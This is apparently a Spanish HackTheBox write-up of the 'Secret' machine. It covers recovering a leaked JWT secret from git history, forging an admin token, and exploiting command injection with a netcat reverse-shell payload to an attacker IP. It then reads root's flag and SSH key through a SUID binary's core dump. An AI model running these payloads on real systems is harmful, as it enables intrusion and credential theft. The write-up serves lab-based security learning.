---
layout: post
title: Secret - WriteUp
author: WildZarek
permalink: /htb/secret
excerpt: "Máquina Linux de nivel fácil en la que estaremos jugando con tokens JWT en la API alojada en el servidor web, analizamos varios archivos javascript y el código fuente de un binario escrito en C para finalmente lograr explotar la funcionalidad CoreDump para escalar privilegios."
description: "Máquina Linux de nivel fácil en la que estaremos jugando con tokens JWT en la API alojada en el servidor web, analizamos varios archivos javascript y el código fuente de un binario escrito en C para finalmente lograr explotar la funcionalidad CoreDump para escalar privilegios."
date: 2022-03-26
header:
  teaser: /assets/images/hackthebox/machines/secret.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Web Exploiting, Privilege Escalation]
tags: [API, JWT, GIT, SOURCE CODE REVIEW, SUID, CORE DUMP]
---

<p align="center"><img src="/assets/images/hackthebox/machines/secret.png"></p>

Saludos pentesters, en esta ocasión vamos a resolver la máquina de HackTheBox llamada **`Secret`**.

## Fecha de Resolución

<p align="center"><a href="https://www.hackthebox.com/achievement/machine/18979/408"><img src="/assets/images/hackthebox/machines/secret/pwned_date.png"></a></p>

## Fase de Reconocimiento

Empezamos con el reconocimiento de puertos lanzando un **`TCP SYN Port Scan`**

| Parámetro | Descripción |
| :-------- | :---------- |
| -p-       | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS       | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo      |
| --open    | Mostrar sólo los puertos que esten abiertos              |
| -vvv      | Triple verbose para ver en consola los resultados        |
| -n        | No efectuar resolución DNS                               |
| -Pn       | No efectuar descubrimiento de hosts                      |
| -oG       | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.120 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 21:51 CET
Initiating SYN Stealth Scan at 21:51
Scanning 10.10.11.120 [65535 ports]
Discovered open port 22/tcp on 10.10.11.120
Discovered open port 80/tcp on 10.10.11.120
Discovered open port 3000/tcp on 10.10.11.120
Completed SYN Stealth Scan at 21:51, 12.94s elapsed (65535 total ports)
Nmap scan report for 10.10.11.120
Host is up, received user-set (0.14s latency).
Scanned at 2022-03-26 21:51:01 CET for 13s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.29 seconds
           Raw packets sent: 65821 (2.896MB) | Rcvd: 65818 (2.633MB)
```

Identificamos los siguientes puertos abiertos:

| Puerto | Descripción |
| :----- | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** - SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web |
| 3000   | De momento nos lo marca como **PPP** pero no sabemos qué es realmente |

Vamos a obtener más información con un escaneo específico sobre los puertos que hemos encontrado.

| Parámetro | Descripción |
| :-------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p22,80,3000 10.10.11.120 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 21:54 CET
Nmap scan report for secret.htb (10.10.11.120)
Host is up (0.079s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.64 seconds
```

Con esto descubrimos a qué servicio pertenece realmente el puerto 3000 del cual no teníamos más información anteriormente:

| Puerto | Descripción |
| :----- | :---------- |
| 3000   | **[Node.js (Express Middleware)](https://es.wikipedia.org/wiki/Nodejs)** |

Veamos con qué está desarrollada la página web utilizando la herramienta **`whatweb`**

```console
p3ntest1ng:~$ whatweb http://10.10.11.120/
http://10.10.11.120/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.120], Lightbox, Meta-Author[Xiaoying Riley at 3rd Wave Media], Script, Title[DUMB Docs], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Aquí no hay mucho que nos sirva salvo algunas referencias a tener en cuenta.
Asignamos un hostname a la máquina en el archivo **`/etc/hosts`** para mayor comodidad.

```console
p3ntest1ng:~$ echo '10.10.11.120 secret.htb' | sudo tee -a /etc/hosts
```

Probemos con **`wfuzz`** a ver qué encontramos, primero con un diccionario pequeño y si no encuentro nada, usaré uno más grande.

| Parámetro | Descripción |
| --------- | :---------- |
| -c        | Muestra el output en formato colorizado |
| -w        | Utiliza el diccionario especificado |
| --hc 404  | Oculta todos los códigos de estado 404 |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://secret.htb/FUZZ 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://secret.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000001:   200        265 L    668 W      12872 Ch    "http://secret.htb/"                                                                                                        
000000428:   200        0 L      12 W       93 Ch       "api"                                                                                                                       
000000499:   301        10 L     16 W       179 Ch      "assets"                                                                                                                    
000001319:   200        486 L    1119 W     20720 Ch    "docs"                                                                                                                      
000001340:   301        10 L     16 W       183 Ch      "download"                                                                                                                  

Total time: 0
Processed Requests: 4614
Filtered Requests: 4609
Requests/sec.: 0
```

Tenemos algo interesante, vemos un directorio **`api`**, así que vamos a revisar la página web para obtener más información.

![Website](/assets/images/hackthebox/machines/secret/website.png)

Una vez dentro lo primero que me llama la atención es que podemos descargar un archivo con nombre **`files.zip`**,
también nos hablan de una [API](https://es.wikipedia.org/wiki/Interfaz_de_programaci%C3%B3n_de_aplicaciones) y de tokens [JWT](https://es.wikipedia.org/wiki/JSON_Web_Token).
Nos descargamos el .zip y lo descomprimimos:

```console
p3ntest1ng:~$ 7z x files.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21

Scanning the drive for archives:
1 file, 28849603 bytes (28 MiB)

Extracting archive: files.zip
--            
Path = files.zip
Type = zip
Physical Size = 28849603

Everything is Ok                                                               

Folders: 769
Files: 8405
Size:       54594055
Compressed: 28849603
```

Al descomprimirlo nos crea un directorio **`local-web`**, donde se observa que es un repositorio git, del cual podemos extraer información con una serie de scripts para la ocasión.
Para ello nos clonamos el siguiente repositorio: **https://github.com/internetwache/GitTools**

```console
p3ntest1ng:~$ ls -la local-web
drwxrwx--- root vboxsf 4.0 KB Fri Sep  3 07:57:09 2021  .
drwxrwx--- root vboxsf   0 B  Sat Mar 26 23:03:19 2022  ..
drwxrwx--- root vboxsf 4.0 KB Wed Sep  8 20:33:32 2021  .git
drwxrwx--- root vboxsf   0 B  Fri Aug 13 06:42:59 2021  model
drwxrwx--- root vboxsf  48 KB Fri Aug 13 06:42:59 2021  node_modules
drwxrwx--- root vboxsf   0 B  Fri Sep  3 07:54:52 2021  public
drwxrwx--- root vboxsf   0 B  Fri Sep  3 08:32:00 2021  routes
drwxrwx--- root vboxsf   0 B  Fri Aug 13 06:42:59 2021  src
.rwxrwx--- root vboxsf  72 B  Fri Sep  3 07:59:44 2021  .env
.rwxrwx--- root vboxsf 885 B  Fri Sep  3 07:56:23 2021  index.js
.rwxrwx--- root vboxsf  68 KB Fri Aug 13 06:42:59 2021  package-lock.json
.rwxrwx--- root vboxsf 491 B  Fri Aug 13 06:42:59 2021  package.json
.rwxrwx--- root vboxsf 651 B  Fri Aug 13 06:42:59 2021  validations.js
```

Una vez hecho, nos metemos en el directorio **`GitTools/Extractor`** y ejecutamos el script **`extractor.sh`**

```
p3ntest1ng:~$ ./extractor.sh ../../content/local-web ../../content/dump
```

Esto tardará un buen rato ya que el repositorio tiene un tamaño superior a 54MB.
Mientras termina, revisamos el directorio **`routes`** dentro de **`local-web`** donde hay algunos archivos JavaScript interesantes.

```console
p3ntest1ng:~$ ls -la local-web/routes
drwxrwx--- root vboxsf   0 B  Fri Sep  3 08:32:00 2021  .
drwxrwx--- root vboxsf 4.0 KB Fri Sep  3 07:57:09 2021  ..
.rwxrwx--- root vboxsf 2.1 KB Fri Aug 13 06:42:59 2021  auth.js
.rwxrwx--- root vboxsf 666 B  Fri Aug 13 06:42:59 2021  forgot.js
.rwxrwx--- root vboxsf 1.5 KB Wed Sep  8 20:32:32 2021  private.js
.rwxrwx--- root vboxsf 390 B  Fri Aug 13 06:42:59 2021  verifytoken.js
```

El primero que analizo es **`auth.js`** y vemos que en el proceso de login se crea el token JWT que va firmado con un **TOKEN_SECRET**

```javascript
...[snip]...
  // login 
  
  router.post('/login', async  (req , res) => {
  
      const { error } = loginValidation(req.body)
      if (error) return res.status(400).send(error.details[0].message);
  
      // check if email is okay 
      const user = await User.findOne({ email: req.body.email })
      if (!user) return res.status(400).send('Email is wrong');
  
      // check password 
      const validPass = await bcrypt.compare(req.body.password, user.password)
      if (!validPass) return res.status(400).send('Password is wrong');
  
  
      // create jwt 
      const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
      res.header('auth-token', token).send(token);
  
  })
...[snip]...
```

Al cabo de un rato largo, una vez que ha terminado el script de extracción, nos crea un directorio **dump**, 
en el cual veremos directorios como estos (correspondientes a distintos commits):

```console
p3ntest1ng:~$ ls -la dump
drwxrwx--- root vboxsf 4.0 KB Fri Dec 31 01:07:47 2021  .
drwxrwx--- root vboxsf   0 B  Sat Mar 26 23:03:19 2022  ..
drwxrwx--- root vboxsf   0 B  Fri Dec 31 00:50:27 2021  0-3a367e735ee76569664bf7754eaaade7c735d702
drwxrwx--- root vboxsf   0 B  Fri Dec 31 00:59:23 2021  1-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
drwxrwx--- root vboxsf   0 B  Fri Dec 31 01:07:44 2021  2-55fe756a29268f9b4e786ae468952ca4a8df1bd8
drwxrwx--- root vboxsf   0 B  Fri Dec 31 01:12:09 2021  3-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
```

Haciendo un **`ls -la`** de cada uno de estos directorios, vemos que existe un archivo **`.env`**, el cual normalmente se utiliza para almacenar variables TOKEN.
Veamos qué contienen estos archivos:

```console
p3ntest1ng:~$ catn dump/0-3a367e735ee76569664bf7754eaaade7c735d702/.env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

p3ntest1ng:~$ catn dump/1-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

p3ntest1ng:~$ catn dump/2-55fe756a29268f9b4e786ae468952ca4a8df1bd8/.env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

p3ntest1ng:~$ catn dump/3-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78/.env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

Vemos que en el último commit eliminaron el token hardcodeado. Teniendo el **TOKEN_SECRET** analicemos la sección **Register user** en la web, donde nos explican el funcionamiento de la API.

![API User Register](/assets/images/hackthebox/machines/secret/howtoregister.png)

![API User Login](/assets/images/hackthebox/machines/secret/howtologin1.png)

![API User Login](/assets/images/hackthebox/machines/secret/howtologin2.png)

![API User Login](/assets/images/hackthebox/machines/secret/howtologin3.png)

![API User Login](/assets/images/hackthebox/machines/secret/accessprivateroute.png)

![API User Login](/assets/images/hackthebox/machines/secret/whenadmin.png)

![API User Login](/assets/images/hackthebox/machines/secret/whenuser.png)

![API User Login](/assets/images/hackthebox/machines/secret/notverified.png)

Hemos obtenido mucha información así que vamos a ir poniendo en claro lo que sabemos:
Tenemos una API a la que podemos lanzar consultas, lo primero es registrarnos como usuario.

Necesitamos lanzar una petición POST al endpoint **http://secret.htb:3000/api/user/register**, podemos hacerlo con **`curl`**
<br/>
El JSON tiene que estar formado así:

```json
  {
	"name": "wildzarek",
	"email": "root@pentesting.net",
	"password": "wild1234"
  }
```

```console
p3ntest1ng:~$ curl -s -X POST "http://secret.htb:3000/api/user/register" -H "Content-Type: application/json" \
                -d '{"name": "wildzarek", "email": "root@pentesting.net", "password": "wild1234"}'; echo
{"user":"wildzarek"}
```

Como vimos en la documentación, si la petición nos devuelve algo como **`{"user":"wildzarek"}`** significa que el registro ha ido bien.
Ahora vamos a loguearnos con el usuario que acabamos de crear, haciendo otra petición a la API con **`curl`**. El JSON sería el siguiente:

```json
  {
	"email": "root@pentesting.net",
	"password": "wild1234"
  }
```

```console
p3ntest1ng:~$ curl -s -X POST "http://secret.htb:3000/api/user/login" -H "Content-Type: application/json" \
                -d '{"email": "root@pentesting.net", "password": "wild1234"}'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmYTQ5NTQyZTU5NjA0NWJjZTAzNWEiLCJuYW1lIjoid2lsZHphcmVrIiwiZW1haWwiOiJyb290QHBlbnRlc3RpbmcubmV0IiwiaWF0IjoxNjQ4MzM4NDI1fQ.a7tfx8GG9QBPbJextCy-Jz3jAVEwkbXooMacLZ-G9T8
```

Teniendo un usuario válido y el token JWT, podemos lanzar una petición GET para verificar nuestro estado en la API.

```console
p3ntest1ng:~$ curl -s -X GET "http://secret.htb:3000/api/priv" \
                -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmYTQ5NTQyZTU5NjA0NWJjZTAzNWEiLCJuYW1lIjoid2lsZHphcmVrIiwiZW1haWwiOiJyb290QHBlbnRlc3RpbmcubmV0IiwiaWF0IjoxNjQ4MzM4NDI1fQ.a7tfx8GG9QBPbJextCy-Jz3jAVEwkbXooMacLZ-G9T8" | jq
{
  "role": {
    "role": "you are normal user",
    "desc": "wildzarek"
  }
}
```

No tenemos privilegios, somos un usuario común y corriente. Veamos cómo podemos obtener el rol de administrador.
Anteriormente vimos que en el directorio **`routes`** teníamos varios archivos javascript. Analicemos **`verifytoken.js`**.

```console
p3ntest1ng:~$ cd local-web/routes && ll
.rwxrwx--- root vboxsf 2.1 KB Fri Aug 13 06:42:59 2021  auth.js
.rwxrwx--- root vboxsf 666 B  Fri Aug 13 06:42:59 2021  forgot.js
.rwxrwx--- root vboxsf 1.5 KB Wed Sep  8 20:32:32 2021  private.js
.rwxrwx--- root vboxsf 390 B  Fri Aug 13 06:42:59 2021  verifytoken.js
```

```javascript
const jwt = require("jsonwebtoken");
  
  module.exports = function (req, res, next) {
      const token = req.header("auth-token");
      if (!token) return res.status(401).send("Access Denied");
  
      try {
          const verified = jwt.verify(token, process.env.TOKEN_SECRET);
          req.user = verified;
          next();
      } catch (err) {
          res.status(400).send("Invalid Token");
      }
  };
```

Según este script de verificación, nuestro token debe estar firmado con el **`TOKEN_SECRET`** que encontramos anteriormente.
Podemos hacer todo esto en la página **https://jwt.io/**
<br/>
Veamos cómo está construido nuestro JWT (algo que ya vimos en la documentación de la web).

![JSON Web Token](/assets/images/hackthebox/machines/secret/jwt_token.png)

Podemos modificar nuestro token para cambiar nuestro usuario a **`theadmin`**, que sabemos que existe en la API y tiene privilegios.
Finalmente firmamos el nuevo token con el TOKEN_SECRET y copiamos el JWT generado.

![JWT Signed](/assets/images/hackthebox/machines/secret/jwt_signed.png)

Volvamos a probar con este nuevo token para ver si es válido y nos loguea con privilegios.

```console
p3ntest1ng:~$ curl -s -X GET "http://secret.htb:3000/api/priv" \
                -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmYTQ5NTQyZTU5NjA0NWJjZTAzNWEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAcGVudGVzdGluZy5uZXQiLCJpYXQiOjE2NDgzMzg0MjV9.F4KOyd5y9h6hTc32fCP2eUHq89jQb2ZoW3hJDGJsScA" | jq
{
  "creds": {
    "role": "admin",
    "username": "theadmin",
    "desc": "welcome back admin"
  }
}
```

Perfecto, el sistema nos reconoce como administrador. Vamos a analizar otro JavaScript.
<br/>
Si nos fijamos en esta parte, vemos que la ruta **`/logs`** es vulnerable a [Remote Code Execution](https://beaglesecurity.com/blog/vulnerability/remote-code-execution.html):

**`private.js`**
```javascript
...[snip]...
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
...[snip]...
```

## Fase de Explotación

Por lo tanto vamos a ganar acceso generando una shell reversa que le pasaremos al endpoint mencionado. Nuestro payload es el siguiente:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.104 9999 >/tmp/f
```

Primero vamos a "encodearlo" para evitar posibles problemas utilizando la web **https://www.urlencoder.io/**
> **NOTA:** También podrías ponerlo como base64, no hay problema, yo lo he hecho así porque quería hacerlo de otro modo distinto a lo habitual.

```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.104%209999%20%3E%2Ftmp%2Ff
```

Nos ponemos en escucha con **`netcat`** por el puerto 9999 (o el que quieras):

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
```

Lanzamos la petición con curl al endpoint vulnerable:
> **NOTA:** Es importante que antes de nuestro payload metamos un punto y coma, esto separa el comando de lo que haya delante.

```console
p3ntest1ng:~$ curl -s -X GET "http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.104%209999%20%3E%2Ftmp%2Ff" \
                -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmYTQ5NTQyZTU5NjA0NWJjZTAzNWEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAcGVudGVzdGluZy5uZXQiLCJpYXQiOjE2NDgzMzg0MjV9.F4KOyd5y9h6hTc32fCP2eUHq89jQb2ZoW3hJDGJsScA" &; disown
```

Y finalmente obtenemos la esperada shell, pero antes de continuar vamos a realizar un tratamiento a la tty para mayor comodidad:

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.16.104] from (UNKNOWN) [10.10.11.120] 45134
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
dasith@secret:~/local-web$ ^Z
zsh: suspended  nc -nlvp 9999
p3ntest1ng:~$ stty raw -echo; fg
[1]  + continued  nc -nlvp 9999
                               reset xterm
dasith@secret:~/local-web$ export TERM=xterm
dasith@secret:~/local-web$ export SHELL=bash
dasith@secret:~/local-web$ stty rows 43 columns 189
```

Y por último leemos la flag de usuario:

```console
dasith@secret:~/local-web$ cd && ls
local-web  user.txt
dasith@secret:~$ cat user.txt
b059b84ef86644c8c6f1f085b999296e
```

## Escalada de Privilegios

Vamos a comprobar los permisos a nivel de sudo en primer lugar.

```console
dasith@secret:~/local-web$ sudo -l
[sudo] password for dasith: 
dasith@secret:~/local-web$ 
```

Nos pide contraseña, por lo tanto pasamos directamente a la búsqueda de posibles [SUID](https://es.wikipedia.org/wiki/Setuid).

```console
dasith@secret:~/local-web$ find / -type f -perm -u=s 2>/dev/null | grep -vE "snap|lib"
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/opt/count
```

Lo primero que vemos es **`pkexec`**, podríamos aprovechar la vulnerabilidad y ganar acceso privilegiado en cuestión de segundos.

```console
dasith@secret:~/local-web$ which pkexec | xargs ls -l
-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
```

Nosotros vamos a resolver esta parte tal y como estaba previsto por el autor de la máquina. Sigamos.
En el directorio **`/opt`** hay algo interesante, un binario **`count`**. Nos movemos al directorio y revisamos.

```console
dasith@secret:~/local-web$ cd /opt && ls -l
total 32
-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count
-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log
```

Tenemos un archivo **`code.c`** así que vamos a leerlo. Este es el contenido:

```c
...[snip]...
int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

Tras analizar esta parte del código (suprimí todo lo anterior por ser irrelevante), vemos que se está haciendo uso de [CoreDump](https://es.wikipedia.org/wiki/Volcado_de_memoria)

#### ¿Pero qué hace exactamente Core Dump?
> Cuando ocurre una excepción mientras el programa se está ejecutando, se guardan en un archivo los datos almacenados en memoria por el binario.

Por lo tanto necesitamos provocar una excepción durante la ejecución de este programa para que sus datos queden volcados.
Generalmente estos datos se guardan en la ruta **`/var/crash`**

```console
dasith@secret:/opt$ ls /var/crash
_opt_count.0.crash  _opt_countzz.0.crash
```

Primero ejecutamos el binario, le pasamos por ejemplo **/root/root.txt** como ruta y presionamos las teclas Ctrl+Z para dejarlo en segundo plano.

#### Antes de la excepción:
```console
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$
```

Ahora tenemos que buscar el PID del proceso y matarlo con **`kill`** enviando una señal BUS.
Existen muchas otras señales, vamos a listarlas:

```console
dasith@secret:/opt$ kill -l
 1) SIGHUP	     2) SIGINT	     3) SIGQUIT	     4) SIGILL	     5) SIGTRAP
 6) SIGABRT	     7) SIGBUS	     8) SIGFPE	     9) SIGKILL	    10) SIGUSR1
11) SIGSEGV	    12) SIGUSR2	    13) SIGPIPE	    14) SIGALRM	    15) SIGTERM
16) SIGSTKFLT	17) SIGCHLD	    18) SIGCONT	    19) SIGSTOP	    20) SIGTSTP
21) SIGTTIN	    22) SIGTTOU	    23) SIGURG	    24) SIGXCPU	    25) SIGXFSZ
26) SIGVTALRM	27) SIGPROF	    28) SIGWINCH	29) SIGIO	    30) SIGPWR
31) SIGSYS      34) SIGRTMIN	35) SIGRTMIN+1	36) SIGRTMIN+2	37) SIGRTMIN+3
38) SIGRTMIN+4	39) SIGRTMIN+5	40) SIGRTMIN+6	41) SIGRTMIN+7	42) SIGRTMIN+8
43) SIGRTMIN+9	44) SIGRTMIN+10	45) SIGRTMIN+11	46) SIGRTMIN+12	47) SIGRTMIN+13
48) SIGRTMIN+14	49) SIGRTMIN+15	50) SIGRTMAX-14	51) SIGRTMAX-13	52) SIGRTMAX-12
53) SIGRTMAX-11	54) SIGRTMAX-10	55) SIGRTMAX-9	56) SIGRTMAX-8	57) SIGRTMAX-7
58) SIGRTMAX-6	59) SIGRTMAX-5	60) SIGRTMAX-4	61) SIGRTMAX-3	62) SIGRTMAX-2
63) SIGRTMAX-1	64) SIGRTMAX
```

Estas señales se pueden especificar de tres formas (dependiendo del sistema):

- Usando su valor numérico. (Ejemplo: **`kill -1`** o **`kill -s 1`**)
- Usando el prefijo **SIG**. (Ejemplo: **`kill -SIGBUS`**)
- Sin el prefijo **SIG**. (Ejemplo: **`kill -BUS`**)

Sigamos...

```console
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   8195 pts/8    00:00:00 sh
   8196 pts/8    00:00:00 bash
   8934 pts/8    00:00:00 count
   8938 pts/8    00:00:00 ps
dasith@secret:/opt$ kill -BUS 8934
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   8195 pts/8    00:00:00 sh
   8196 pts/8    00:00:00 bash
   8934 pts/8    00:00:00 count
   8939 pts/8    00:00:00 ps
```

Sigue estando ahí pero si nos volvemos a la sesión con **`fg`**, vemos que se ha producido el error.

#### Después de la excepción:
```console
dasith@secret:/opt$ fg
./count
Bus error (core dumped)
```

Con esto se ha generado un nuevo archivo en **`/var/crash`**

```console
dasith@secret:/opt$ cd /var/crash && ls
_opt_count.0.crash  _opt_count.1000.crash  _opt_countzz.0.crash
```

Creamos un nuevo directorio dentro de la ruta **`/tmp`** con el nombre que queramos:

```console
dasith@secret:/opt$ mkdir /tmp/pwned
```

Existe una herramienta llamada **`apport-unpack`** para poder desempacar este tipo de reportes.

```console
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/pwned
dasith@secret:/opt$ cd /tmp/pwned && ls -l
total 428
-rw-r--r-- 1 dasith dasith      5 Mar 27 03:19 Architecture
-rw-r--r-- 1 dasith dasith 380928 Mar 27 03:19 CoreDump
-rw-r--r-- 1 dasith dasith     24 Mar 27 03:19 Date
-rw-r--r-- 1 dasith dasith     12 Mar 27 03:19 DistroRelease
-rw-r--r-- 1 dasith dasith     10 Mar 27 03:19 ExecutablePath
-rw-r--r-- 1 dasith dasith     10 Mar 27 03:19 ExecutableTimestamp
-rw-r--r-- 1 dasith dasith      5 Mar 27 03:19 ProblemType
-rw-r--r-- 1 dasith dasith      7 Mar 27 03:19 ProcCmdline
-rw-r--r-- 1 dasith dasith      4 Mar 27 03:19 ProcCwd
-rw-r--r-- 1 dasith dasith     61 Mar 27 03:19 ProcEnviron
-rw-r--r-- 1 dasith dasith   2144 Mar 27 03:19 ProcMaps
-rw-r--r-- 1 dasith dasith   1336 Mar 27 03:19 ProcStatus
-rw-r--r-- 1 dasith dasith      1 Mar 27 03:19 Signal
-rw-r--r-- 1 dasith dasith     29 Mar 27 03:19 Uname
-rw-r--r-- 1 dasith dasith      3 Mar 27 03:19 UserGroups
```

Finalmente extraemos los strings del archivo CoreDump y con esto logramos ver entre todos los resultados la flag de root.

```console
p3ntest1ng:~$ strings CoreDump
...[snip]...
/root/root.txt
6f9a8c764f59ac05f1df356622bb10e5
...[snip]...
```

Pero espera...no hemos conseguido una shell del sistema con todos los privilegios. Vamos a ello.

Lo más fácil sería repetir el proceso anterior pero apuntando al archivo **`id_rsa`** ubicado en **`/root/.ssh/id_rsa`**
y cuando logremos leer la clave privada, la volcamos a un archivo en nuestro sistema y ajustamos los permisos de dicho archivo con **`chmod 600 secretkey`**

```console
p3ntest1ng:~$ ssh -i secretkey 10.10.11.120
...[snip]...
root@secret:~# cd /root/ && ls
root.txt  snap
root@secret:~# cat root.txt
6f9a8c764f59ac05f1df356622bb10e5
```

Y eso sería todo, espero que os haya gustado y como siempre:

### ¡Gracias por leer hasta el final!

De esta máquina me ha gustado la progresión y la escalada de privilegios, ya que es algo que no había visto anteriormente y me ha servido para aprender sobre el Core Dump de binarios.

#### Nos vemos en un próximo. ¡Feliz hacking! ☠